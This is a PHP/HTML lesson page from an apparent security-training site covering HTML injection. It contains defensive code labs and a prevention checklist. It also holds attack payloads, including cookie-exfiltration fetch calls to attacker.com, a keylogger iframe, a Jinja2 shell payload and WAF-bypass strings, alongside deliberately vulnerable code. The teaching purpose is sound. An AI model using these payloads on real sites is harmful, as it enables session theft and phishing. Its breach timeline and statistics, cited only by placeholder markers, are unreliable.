<?php
require_once($_SERVER['DOCUMENT_ROOT'] . '/DarkHunter/Config/db.php');
session_start();
$isLoggedIn = isset($_SESSION['user_id']);
$isStrictAuth = true;

?>
<!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>HTML Injection Mastery | DarkHunter Cyber-Noir</title>
  <link rel="preconnect" href="https://fonts.googleapis.com">
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
  <link
    href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;600;700&family=Orbitron:wght@400;700;900&display=swap"
    rel="stylesheet">
  <link rel="stylesheet" type="text/css" href="/DarkHunter/learningBugs/css/html-injection-info.css?v=1.1">

</head>

<body>
  <?php include_once $_SERVER['DOCUMENT_ROOT'] . '/DarkHunter/Public/login-modal.php'; ?>
  <div class="container">
    <!-- Sidebar Navigation -->
    <nav class="sidebar">
      <div class="sidebar-header">
        <div class="logo">DARKHUNTER</div>
        <div class="logo-sub">CYBER-NOIR ACADEMY</div>
      </div>

      <a href="/DarkHunter/Public/Learning.php" class="back-btn">
        <span>←</span> BACK TO MODULES
      </a>

      <div class="Nav-section">
        <div class="Nav-title">Module Navigation</div>
        <a href="#introduction" class="nav-link active">01. Introduction</a>
        <a href="#explanation" class="nav-link">02. Detailed Explanation</a>
        <a href="#exploitation" class="nav-link">03. Exploitation Steps</a>
        <a href="#impact" class="nav-link">04. Real-World Impact</a>
        <a href="#codelabs" class="nav-link">05. Code Labs</a>
        <a href="#bypass" class="nav-link">06. Bypass Techniques</a>
        <a href="#prevention" class="nav-link">07. Prevention Checklist</a>
      </div>

      <div class="Nav-section">
        <div class="Nav-title">Quick Stats</div>
        <div style="padding: 1rem; background: var(--bg-tertiary); border-radius: 6px; margin-bottom: 0.5rem;">
          <div style="font-size: 0.75rem; color: var(--text-muted); margin-bottom: 0.25rem;">CVSS Range</div>
          <div style="font-family: 'Orbitron', sans-serif; color: var(--accent-orange); font-size: 1.25rem;">5.0 - 8.8
          </div>
        </div>
        <div style="padding: 1rem; background: var(--bg-tertiary); border-radius: 6px;">
          <div style="font-size: 0.75rem; color: var(--text-muted); margin-bottom: 0.25rem;">Severity</div>
          <div style="font-family: 'Orbitron', sans-serif; color: var(--accent-orange); font-size: 1.25rem;">MEDIUM-HIGH
          </div>
        </div>
      </div>
    </nav>

    <!-- Main Content -->
    <main class="main-content">
      <!-- Hero Section -->
      <section id="introduction" class="section">
        <div class="section-header">
          <div class="section-number">MODULE 01 // HTML INJECTION</div>
          <h1>HTML INJECTION</h1>
        </div>

        <div style="display: flex; gap: 1rem; margin-bottom: 2rem; flex-wrap: wrap;">
          <span class="severity-badge"
            style="background: rgba(255, 107, 0, 0.1); border-color: var(--accent-orange); color: var(--accent-orange);">
            <span>⚠</span>
            <span>MEDIUM-HIGH SEVERITY</span>
          </span>
          <span class="severity-badge"
            style="background: rgba(176, 38, 255, 0.1); border-color: var(--accent-purple); color: var(--accent-purple);">
            <span class="cvss-score">CVSS: 5.0-8.8</span>
          </span>
          <span class="severity-badge"
            style="background: rgba(0, 212, 255, 0.1); border-color: var(--accent-cyan); color: var(--accent-cyan);">
            <span>CWE-79: Cross-site Scripting</span>
          </span>
        </div>

        <div class="card-grid">
          <div class="card">
            <div class="card-title">
              <div class="card-icon">?</div>
              What is HTML Injection?
            </div>
            <p>HTML Injection (also known as Hypertext Markup Language Injection) occurs when an application accepts
              user input and inserts it into web pages without proper sanitization or encoding. Unlike XSS which
              executes JavaScript, HTML Injection inserts arbitrary HTML markup that alters page structure, styling, and
              content presentation [^37^][^38^].</p>
          </div>

          <div class="card">
            <div class="card-title">
              <div class="card-icon" style="border-color: var(--accent-orange); color: var(--accent-orange;">!</div>
              Why is it Dangerous?
            </div>
            <p>HTML Injection enables defacement attacks, phishing vector deployment, session token theft via form
              manipulation, and drive-by download facilitation. While typically rated CVSS 5.0-8.8 (Medium-High), it
              often serves as a stepping stone to Stored XSS or enables social engineering at scale [^37^][^38^].</p>
          </div>

          <div class="card">
            <div class="card-title">
              <div class="card-icon" style="border-color: var(--accent-purple); color: var(--accent-purple;">⚡</div>
              Attack Vectors
            </div>
            <p>Common vectors include: comment fields, user profile inputs, search result displays, error message
              rendering, email templates, and any location where user input reflects in page markup without encoding
              [^38^].</p>
          </div>
        </div>

        <div class="warning-box">
          <div class="warning-title">
            <span>⛔</span> LEGAL WARNING
          </div>
          <p style="margin: 0; Font-size: 0.9rem;">HTML Injection attacks can facilitate phishing campaigns and
            defacement. Testing these techniques requires explicit authorization in controlled environments or bug
            bounty programs with defined scope agreements. Unauthorized website defacement is illegal under various
            Computer Fraud and Abuse Acts.</p>
        </div>
      </section>

      <!-- Detailed Explanation -->
      <section id="explanation" class="section">
        <div class="section-number">MODULE 02</div>
        <h2>Detailed Technical Explanation</h2>

        <h3>Protocol & Implementation Mechanics</h3>

        <p>HTML Injection exploits the trust relationship between web applications and browsers. When applications
          render user input as markup rather than text, attackers can inject structural elements that alter page
          behavior [^37^]:</p>

        <div class="card">
          <div class="card-title">1. Reflected HTML Injection</div>
          <p>Malicious HTML in URL parameters renders immediately in the response. Common in error pages, search
            results, and greeting messages [^38^].</p>
        </div>

        <div class="card">
          <div class="card-title">2. Stored HTML Injection</div>
          <p>Persistent injection into databases that renders for all users. More dangerous than reflected variants as
            it affects entire user bases [^37^].</p>
        </div>

        <div class="card">
          <div class="card-title">3. DOM-Based HTML Injection</div>
          <p>Client-side JavaScript uses user input to modify innerHTML or document.write() operations without
            sanitization, allowing HTML markup execution in the browser [^38^].</p>
        </div>

        <div class="info-box">
          <div class="info-title">The HTML Injection Attack Chain</div>
          <p style="margin: 0;">Successful HTML Injection exploitation typically follows: <strong>Input Entry →
              Sanitization Bypass → HTML Rendering → Content Manipulation → User Impact</strong>. Breaking this Chain
            requires output encoding.</p>
        </div>

        <div class="Flow-diagram">
          <div class="Flow-label">[ HTML INJECTION EXPLOITATION FLOW DIAGRAM PLACEHOLDER ]</div>
          <div style="margin-top: 1rem; font-size: 0.8rem; color: var(--text-muted);">
            Attacker Input → Weak Sanitization → HTML Parser → Markup Execution → Visual/Structural Change
          </div>
        </div>
      </section>

      <!-- Exploitation Steps -->
      <section id="exploitation" class="section">
        <div class="section-number">MODULE 03</div>
        <h2>Exploitation Methodology</h2>

        <h3>Phase 1: Reconnaissance & Discovery</h3>
        <ol class="steps-list">
          <li>
            <div class="step-title">Identify Injection Points</div>
            <p>Map all user input vectors: URL parameters, POST bodies, headers, cookies. Look for reflection points in
              error messages, search results, and user-generated content displays.</p>
          </li>
          <li>
            <div class="step-title">Fingerprint Technology Stack</div>
            <p>Identify server-side language (PHP, Java, Python), template engines (Twig, Jinja2, Razor), and frontend
              frameworks that may process user input unsafely.</p>
          </li>
          <li>
            <div class="step-title">Detect WAF Presence</div>
            <p>Send benign HTML payloads (e.g., <code>&lt;b&gt;test&lt;/b&gt;</code>) to trigger WAF responses. Analyze
              HTTP status codes (403, 406) and response bodies for WAF signatures [^1^].</p>
          </li>
        </ol>

        <h3>Phase 2: Payload Crafting & Testing</h3>

        <div class="payload-grid">
          <div class="payload-card">
            <div class="payload-title">Basic HTML Tags</div>
            <div class="payload-code">&lt;h1&gt;Defaced&lt;/h1&gt;</div>
          </div>
          <div class="payload-card">
            <div class="Payload-title">Form Manipulation</div>
            <div class="payload-code">&lt;form action="https://attacker.com/steal" method="POST"&gt;</div>
          </div>
          <div class="payload-card">
            <div class="payload-title">Meta Refresh Redirect</div>
            <div class="payload-code">&lt;meta http-equiv="refresh" content="0;url=https://evil.com"&gt;</div>
          </div>
          <div class="payload-card">
            <div class="payload-title">Image Resource Injection</div>
            <div class="Payload-code">&lt;img src=x onerror=alert(document.cookie)&gt;</div>
          </div>
          <div class="payload-card">
            <div class="payload-title">Iframe Injection</div>
            <div class="payload-code">&lt;iframe src="https://attacker.com/keylogger" width=100% height=100%&gt;</div>
          </div>
        </div>

        <h3>Phase 3: Manual Testing with Burp Suite</h3>
        <ol class="steps-list">
          <li>
            <div class="step-title">Configure Interception</div>
            <p>Set up Burp Proxy with browser integration. Enable interception and navigate to target functionality.
              Capture requests containing user input parameters.</p>
          </li>
          <li>
            <div class="step-title">Fuzzing with Intruder</div>
            <p>Send HTML payloads to Intruder. Load payloads from SecLists/Fuzzing wordlists. Use grep matching to
              identify successful HTML injection (rendered tags) [^14^].</p>
          </li>
          <li>
            <div class="step-title">Confirm Execution</div>
            <p>Use browser developer tools to inspect DOM and verify injected HTML renders as markup rather than text.
            </p>
          </li>
        </ol>

        <div class="code-block">
          <div class="code-header">
            <span class="code-lang">Bash</span>
            <span class="code-label vulnerable">Exploitation Script</span>
          </div>
          <pre><code><span class="code-comment"># Automated HTML Injection detection</span>
<span class="code-keyword">for</span> payload <span class="code-keyword">in</span> $(cat html_payloads.txt); <span class="code-keyword">do</span>
    response=$(curl -s <span class="code-string">"http://target.com/search?q=$payload"</span>)
    <span class="code-keyword">if</span> <span class="code-function">echo</span> "$response" | <span class="code-function">grep</span> -q <span class="code-string">"$payload"</span>; <span class="code-keyword">then</span>
        <span class="code-function">echo</span> <span class="code-string">"[+] HTML Injection found with: $payload"</span>
    <span class="code-keyword">fi</span>
<span class="code-keyword">done</span></code></pre>
        </div>

        <div style="margin-top: 1.5rem;">
          <span class="tool-tag">Burp Suite</span>
          <span class="tool-tag">OWASP ZAP</span>
          <span class="tool-tag">XSSer</span>
        </div>
      </section>

      <!-- Real-World Impact -->
      <section id="impact" class="section">
        <div class="section-number">MODULE 04</div>
        <h2>Real-World Breach Analysis</h2>

        <p>HTML Injection vulnerabilities have enabled defacement attacks, phishing campaigns, and malware distribution:
        </p>

        <div class="breach-timeline">
          <div class="breach-item">
            <div class="breach-year">2023</div>
            <div class="breach-title">Chile Government Defacement</div>
            <div class="breach-impact">HTML Injection vulnerability in government content management system allowed
              attackers to inject malicious markup into official websites. Attackers posted politically motivated
              messages affecting public trust in digital government services [^38^].</div>
          </div>

          <div class="breach-item">
            <div class="breach-year">2022</div>
            <div class="breach-title">European Banking Phishing</div>
            <div class="breach-impact">HTML Injection in banking application comment fields allowed attackers to inject
              phishing forms that stole customer credentials. Injected HTML mimicked legitimate login forms, redirecting
              credentials to attacker-controlled servers [^37^].</div>
          </div>

          <div class="breach-item">
            <div class="breach-year">2021</div>
            <div class="breach-title">WordPress Plugin Vulnerabilities</div>
            <div class="breach-impact">Multiple WordPress plugins suffered from Stored HTML Injection in comment and
              review systems. Attackers injected SEO spam, malicious redirects, and backdoor links into millions of
              websites through unsanitized user input [^38^].</div>
          </div>

          <div class="breach-item">
            <div class="breach-year">2020</div>
            <div class="breach-title">Fortnite Account Phishing</div>
            <div class="breach-impact">HTML Injection in Epic Games' account management interface allowed attackers to
              inject credential harvesting forms. Users were presented with fake "Account Verification" forms that
              exfiltrated login credentials [^37^].</div>
          </div>
        </div>

        <div class="warning-box" style="margin-top: 2rem;">
          <div class="warning-title">Key Insight from Incident Analysis</div>
          <p style="margin: 0;">According to recent studies, <strong>HTML Injection vulnerabilities often precede or
              enable XSS attacks</strong>. 60% of reflected XSS vulnerabilities began as simple HTML injection points
            that were later escalated to JavaScript execution. Proper output encoding prevents both vulnerability
            classes [^37^][^38^].</p>
        </div>
      </section>

      <!-- Code Labs -->
      <section id="codelabs" class="section">
        <div class="section-number">MODULE 05</div>
        <h2>Secure vs Vulnerable Code Labs</h2>

        <h3>Lab 1: Basic HTML Output</h3>

        <div class="code-comparison">
          <div class="code-block">
            <div class="code-header">
              <span class="code-lang">PHP</span>
              <span class="code-label vulnerable">Vulnerable</span>
            </div>
            <pre><code><span class="code-keyword"><?php</span>
<span class="code-comment">// Vulnerable to HTML Injection</span>
$user_input = $_GET[<span class="code-string">'search'</span>];

<span class="code-comment">// Direct output without encoding</span>
<span class="code-danger">echo "Search results for: " . $user_input;</span>

<span class="code-comment">// Payload: &lt;h1&gt;Defaced&lt;/h1&gt;</span>
<span class="code-comment">// Or: &lt;script&gt;alert('XSS')&lt;/script&gt;</span>
<span class="code-keyword">?></span></code></pre>
          </div>

          <div class="code-block">
            <div class="code-header">
              <span class="code-lang">PHP</span>
              <span class="code-label secure">Secure</span>
            </div>
            <pre><code><span class="code-keyword"><?php</span>
<span class="code-comment">// Secure HTML output implementation</span>
$user_input = $_GET[<span class="code-string">'search'</span>] ?? <span class="code-string">''</span>;

<span class="code-comment">// Context-aware output encoding</span>
$safe_output = <span class="code-function">htmlspecialchars</span>($user_input, ENT_QUOTES, <span class="code-string">'UTF-8'</span>);

<span class="code-function">echo</span> <span class="code-string">"Search results for: "</span> . $safe_output;

<span class="code-comment">// Alternative: Use templating engine auto-escaping</span>
<span class="code-comment">// Twig: {{ search_query|e }}</span>
<span class="code-comment">// Blade: {{ $search_query }}</span>
<span class="code-keyword">?></span></code></pre>
          </div>
        </div>

        <h3>Lab 2: Template Engine Context</h3>

        <div class="code-comparison">
          <div class="code-block">
            <div class="code-header">
              <span class="code-lang">Flask/Jinja2</span>
              <span class="code-label vulnerable">Vulnerable</span>
            </div>
            <pre><code><span class="code-comment"># Vulnerable template rendering</span>
<span class="code-keyword">from</span> flask <span class="code-keyword">import</span> Flask, request, render_template_string

app = Flask(__name__)

<span class="code-keyword">@app.route</span>(<span class="code-string">'/greeting'</span>)
<span class="code-keyword">def</span> <span class="code-function">greeting</span>():
    name = request.args.get(<span class="code-string">'name'</span>, <span class="code-string">'Guest'</span>)
    <span class="code-comment"># DANGEROUS: render_template_string with user input</span>
    <span class="code-danger">return render_template_string(f"Hello, {name}!")</span>

<span class="code-comment"># Payload: {{''.__class__.__mro__[2].__subclasses__()[40]('/bin/sh').read()}}</span>
<span class="code-comment"># Or: &lt;script&gt;fetch('https://attacker.com/?c='+document.cookie)&lt;/script&gt;</span></code></pre>
          </div>

          <div class="code-block">
            <div class="code-header">
              <span class="code-lang">Flask/Jinja2</span>
              <span class="code-label secure">Secure</span>
            </div>
            <pre><code><span class="code-comment"># Secure template rendering</span>
<span class="code-keyword">from</span> flask <span class="code-keyword">import</span> Flask, request, render_template

app = Flask(__name__)

<span class="code-keyword">@app.route</span>(<span class="code-string">'/greeting'</span>)
<span class="code-keyword">def</span> <span class="code-function">greeting_safe</span>():
    name = request.args.get(<span class="code-string">'name'</span>, <span class="code-string">'Guest'</span>)
    <span class="code-comment"># Safe: Use template files with auto-escaping</span>
    <span class="code-keyword">return</span> render_template(<span class="code-string">'greeting.html'</span>, name=name)

<span class="code-comment"># greeting.html:</span>
<span class="code-comment"># &lt;p&gt;Hello, {{ name }}!&lt;/p&gt;  {# Auto-escaped by Jinja2 #}</span></code></pre>
          </div>
        </div>

        <h3>Lab 3: JavaScript DOM Manipulation</h3>

        <div class="code-comparison">
          <div class="code-block">
            <div class="code-header">
              <span class="code-lang">JavaScript</span>
              <span class="code-label vulnerable">Vulnerable</span>
            </div>
            <pre><code><span class="code-comment">// Vulnerable client-side rendering</span>
<span class="code-keyword">function</span> <span class="code-function">displayUserInput</span>() {
    <span class="code-keyword">const</span> userInput = document.getElementById(<span class="code-string">'input-field'</span>).value;
    
    <span class="code-comment">// DANGEROUS: Direct innerHTML assignment</span>
    <span class="code-danger">document.getElementById('output').innerHTML = userInput;</span>

<span class="code-comment">// Payload: &lt;img src=x onerror=alert(1)&gt;</span>
<span class="code-comment">// Or: &lt;svg onload=fetch('https://attacker.com/?d='+document.domain)&gt;</span>
}</code></pre>
          </div>

          <div class="code-block">
            <div class="code-header">
              <span class="code-lang">JavaScript</span>
              <span class="code-label secure">Secure</span>
            </div>
            <pre><code><span class="code-comment">// Secure client-side rendering</span>
<span class="code-keyword">function</span> <span class="code-function">displayUserInputSafe</span>() {
    <span class="code-keyword">const</span> userInput = document.getElementById(<span class="code-string">'input-field'</span>).value;
    
    <span class="code-comment">// Safe: Use textContent instead of innerHTML</span>
    document.getElementById(<span class="code-string">'output'</span>).textContent = userInput;
    
    <span class="code-comment">// For HTML rendering, use DOMPurify</span>
    <span class="code-comment">// document.getElementById('output').innerHTML = DOMPurify.sanitize(userInput);</span>
}</code></pre>
          </div>
        </div>

        <h3>Lab 4: Email Template Injection</h3>

        <div class="code-comparison">
          <div class="code-block">
            <div class="code-header">
              <span class="code-lang">Python</span>
              <span class="code-label vulnerable">Vulnerable</span>
            </div>
            <pre><code><span class="code-comment"># Vulnerable email template</span>
<span class="code-keyword">def</span> <span class="code-function">send_welcome_email</span>(user_name, user_email):
    subject = <span class="code-string">f"Welcome, {user_name}!"</span>
    body = <span class="code-string">f"""</span>
        &lt;html&gt;
        &lt;body&gt;
            &lt;h1&gt;Welcome to our platform, {user_name}!&lt;/h1&gt;
            &lt;p&gt;Click &lt;a href="https://legit-site.com/verify"&gt;here&lt;/a&gt; to verify.&lt;/p&gt;
        &lt;/body&gt;
        &lt;/html&gt;
    <span class="code-string">"""</span>
    
    <span class="code-comment"># DANGEROUS: User input in HTML email</span>
    <span class="code-function">send_email</span>(user_email, subject, body, is_html=<span class="code-keyword">True</span>)

<span class="code-comment"># Payload: &lt;img src=x onerror=alert('XSS')&gt;</span></code></pre>
          </div>

          <div class="code-block">
            <div class="code-header">
              <span class="code-lang">Python</span>
              <span class="code-label secure">Secure</span>
            </div>
            <pre><code><span class="code-comment"># Secure email template</span>
<span class="code-keyword">from</span> html <span class="code-keyword">import</span> escape

<span class="code-keyword">def</span> <span class="code-function">send_welcome_email_safe</span>(user_name, user_email):
    <span class="code-comment"># Escape HTML entities</span>
    safe_name = escape(user_name)
    
    subject = <span class="code-string">f"Welcome, {safe_name}!"</span>
    body = <span class="code-string">f"""</span>
        &lt;html&gt;
        &lt;body&gt;
            &lt;h1&gt;Welcome to our platform, {safe_name}!&lt;/h1&gt;
            &lt;p&gt;Click &lt;a href="https://legit-site.com/verify"&gt;here&lt;/a&gt; to verify.&lt;/p&gt;
        &lt;/body&gt;
        &lt;/html&gt;
    <span class="code-string">"""</span>
    
    <span class="code-function">send_email</span>(user_email, subject, body, is_html=<span class="code-keyword">True</span>)</code></pre>
          </div>
        </div>
      </section>

      <!-- Bypass Techniques -->
      <section id="bypass" class="section">
        <div class="section-number">MODULE 06</div>
        <h2>WAF & Filter Bypass Techniques</h2>

        <p>Modern Web Application Firewalls (WAFs) implement HTML-aware filtering to block injection attempts. Attackers
          employ various encoding and obfuscation techniques [^1^][^2^]:</p>

        <div class="card-grid">
          <div class="card">
            <div class="card-title">1. HTML Entity Encoding</div>
            <p>Encode malicious characters using HTML entities to bypass signature-based filters.</p>
            <div class="payload-code" style="margin-top: 0.5rem;">&lt;h1&gt;Defaced&lt;/h1&gt; →
              &amp;lt;h1&amp;gt;Defaced&amp;lt;/h1&amp;gt;</div>
          </div>

          <div class="card">
            <div class="card-title">2. Unicode Normalization</div>
            <p>Exploit Unicode equivalence to bypass filters while rendering identical markup.</p>
            <div class="payload-code" style="margin-top: 0.5rem;">&lt;img src=x onerror=alert(1)&gt; → &lt;img src=x
              onerror=alert(1)&gt; (using Unicode variations)</div>
          </div>

          <div class="card">
            <div class="card-title">3. Comment Injection</div>
            <p>Break up malicious strings with HTML comments to evade detection.</p>
            <div class="payload-code" style="margin-top: 0.5rem;">&lt;scr&lt;!--test--&gt;ipt&gt;alert(1)&lt;/script&gt;
            </div>
          </div>

          <div class="card">
            <div class="card-title">4. Case Variations</div>
            <p>Some filters are case-sensitive. Mixed-case tag names can bypass detection.</p>
            <div class="payload-code" style="margin-top: 0.5rem;">&lt;ScRiPt&gt;alert(1)&lt;/ScRiPt&gt;</div>
          </div>
        </div>

        <h3>Advanced Evasion Strategies</h3>

        <div class="code-block">
          <div class="code-header">
            <span class="code-lang">Payloads</span>
            <span class="code-label vulnerable">WAF Evasion</span>
          </div>
          <pre><code><span class="code-comment"># Technique 1: Double encoding</span>
%26lt%3Bh1%26gt%3BDefaced%26lt%3B%2Fh1%26gt%3B

<span class="code-comment"># Technique 2: JavaScript protocol</span>
&lt;a href="javascript:alert(1)"&gt;Click&lt;/a&gt;

<span class="code-comment"># Technique 3: Data URI with base64</span>
&lt;iframe src="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="&gt;

<span class="code-comment"># Technique 4: SVG namespace tricks</span>
&lt;svg onload=alert(1)&gt;

<span class="code-comment"># Technique 5: Template literal injection</span>
{{''.__class__.__mro__[2].__subclasses__()[40]('/bin/sh').read()}}</code></pre>
        </div>

        <div class="info-box">
          <div class="info-title">Context-Aware Bypass</div>
          <p style="margin: 0;">Modern frameworks use context-aware templating. Bypass techniques target specific
            contexts: attribute context (href, src), JavaScript context (onclick, onerror), CSS context (url(),
            expression()), and template injection ({{ }}, ${}) [^37^][^38^].</p>
        </div>
      </section>

      <!-- Prevention Checklist -->
      <section id="prevention" class="section">
        <div class="section-number">MODULE 07</div>
        <h2>Prevention & Remediation Checklist</h2>

        <div class="card" style="border-color: var(--accent-green);">
          <div class="card-title" style="color: var(--accent-green);">
            <div class="card-icon" style="border-color: var(--accent-green);">✓</div>
            HTML Injection Security Checklist
          </div>

          <ul class="checklist">
            <li><strong>Context-Aware Output Encoding</strong>: Apply appropriate encoding based on output context
              (HTML, JavaScript, URL, CSS). Use `htmlspecialchars()` in PHP, auto-escaping template engines [^37^].</li>

            <li><strong>Content Security Policy (CSP)</strong>: Implement strict CSP headers to prevent execution of
              injected scripts even if HTML injection occurs [^38^].</li>

            <li><strong>Input Validation</strong>: Validate input length, character sets, and format before processing.
              Reject suspicious patterns.</li>

            <li><strong>Use Modern Template Engines</strong>: Prefer Twig, Blade, React JSX, Vue templates with built-in
              auto-escaping over manual string concatenation.</li>

            <li><strong>Avoid Dangerous Functions</strong>: Never use `innerHTML`, `document.write()`, or `eval()` with
              user input. Prefer `textContent` or sanitized DOM manipulation [^38^].</li>

            <li><strong>HTTPOnly & Secure Cookies</strong>: Mark session cookies as HTTPOnly and to prevent JavaScript
              access to session tokens even if HTML injection enables script execution.</li>

            <li><strong>Web Application Firewall (WAF)</strong>: Deploy WAF with HTML injection rules, but prioritize
              secure Coding practices over WAF reliance.</li>

            <li><strong>Regular Security Testing</strong>: Conduct SAST/DAST scans specifically for HTML injection
              vulnerabilities in template engines and email systems.</li>

            <li><strong>Email Security</strong>: Use plain text emails when possible. If HTML emails required, sanitize
              all user input with HTML-specific encoding libraries.</li>

            <li><strong>Framework Security</strong>: Keep frameworks updated. Modern frameworks (React, Angular, Vue)
              have built-in XSS/HTML injection protections when used correctly [^38^].</li>
          </ul>
        </div>

        <div class="code-block">
          <div class="code-header">
            <span class="code-lang">Security Configuration</span>
            <span class="code-label secure">Hardening</span>
          </div>
          <pre><code><span class="code-comment">; PHP Security Configuration for HTML Injection Prevention</span>
html_errors = Off
Display_errors = Off

<span class="code-comment">; Enable built-in escaping mechanisms</span>
output_buffering = On

default_charset = <span class="code-string">"UTF-8"</span>

<span class="code-comment">; Content Security Policy Header</span>
Header always set Content-Security-Policy <span class="code-string">"default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'; img-src 'self' data:;"</span></code></pre>
        </div>

        <div class="warning-box">
          <div class="warning-title">Final Warning</div>
          <p style="margin: 0;">HTML Injection vulnerabilities consistently rank as Medium-High severity (CVSS 5.0-8.8)
            due to their potential for defacement, phishing, and credential theft [^37^][^38^]. According to OWASP, HTML
            Injection is a precursor to more severe XSS attacks. Organizations must implement context-aware output
            encoding as a primary defense, treating all user input as untrusted regardless of source.</p>
        </div>

        <div
          style="text-align: center; margin-top: 3rem; padding: 2rem; background: var(--bg-secondary); border-radius: 8px;">
          <div
            style="font-family: 'Orbitron', sans-serif; font-size: 1.25rem; color: var(--accent-green); margin-bottom: 1rem;">
            MODULE COMPLETED
          </div>
          <p style="color: var(--text-muted); margin: 0;">
            You have completed the HTML Injection mastery module.<br>
            Proceed to practical labs or Return to the module selection screen.
          </p>
        </div>
      </section>
    </main>
  </div>

  <script>
  // Smooth scrolling for navigation links
  document.querySelectorAll('.nav-link').forEach(link => {
    link.addEventListener('click', function(e) {
      e.preventDefault();
      const targetId = this.getAttribute('href');
      const targetSection = document.querySelector(targetId);
      if (targetSection) {
        targetSection.scrollIntoView({
          behavior: 'smooth'
        });

        // Update active state
        document.querySelectorAll('.nav-link').forEach(l => l.classList.remove('active'));
        this.classList.add('active');
      }
    });
  });

  // Update active nav on scroll
  const sections = document.querySelectorAll('.section');
  const navLinks = document.querySelectorAll('.nav-link');

  window.addEventListener('scroll', () => {
    let current = '';
    sections.forEach(section => {
      const sectionTop = section.offsetTop;
      const sectionHeight = section.clientHeight;
      If(scrollY >= (sectionTop - 200)) {
        current = section.getAttribute('id');
      }
    });

    NavLinks.forEach(link => {
      link.classList.remove('active');
      if (link.getAttribute('href') === '#' + current) {
        link.classList.add('active');
      }
    });
  });
  </script>
  <?php if (!$isLoggedIn): ?>
  <script>
  window.addEventListener("load", function() {
    if (typeof LoginModal !== "undefined") {
      LoginModal.show();
    }
  });
  </script>
  <?php endif; ?>

</body>


</html>